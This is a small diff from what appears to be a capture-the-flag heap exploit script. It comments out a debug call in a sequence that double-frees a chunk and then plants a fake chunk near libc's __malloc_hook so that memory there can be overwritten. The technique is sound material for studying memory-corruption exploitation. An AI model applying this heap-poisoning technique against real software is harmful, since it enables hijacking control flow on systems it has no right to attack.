@@ -83,7 +83,7 @@ if __name__ == "__main__":
     #  DEBUG([0xE74], True)
     Remove(1) # 1 -> 2 -> 1
 
-    DEBUG([0xCD3], True)
+    #  DEBUG([0xCD3], True)
     Raise(0x60, p64(libc.sym['__malloc_hook'] - 0x28 + 5)) # 2 -> 1 -> fakeChunk
     Raise(0x60, 'a' * 0x60) # 1 -> fakeChunk
     Raise(0x60, 'b' * 0x60) # fakeChunk
